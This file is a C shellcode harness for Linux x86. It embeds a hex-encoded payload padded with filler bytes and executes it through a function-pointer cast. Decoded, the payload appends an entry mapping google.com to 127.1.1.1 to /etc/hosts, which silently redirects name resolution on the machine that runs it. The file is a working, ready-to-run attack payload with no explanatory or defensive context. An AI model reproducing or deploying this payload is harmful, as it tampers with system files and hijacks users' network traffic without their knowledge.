#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x9b\x9b\x9b\x93\x6a\x04\x58\xeb\x15\x9b\x9b\x9b\x59\x6a\x14\x5a\xcd\x80\x9b\x9b\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xe9\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d"
;

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
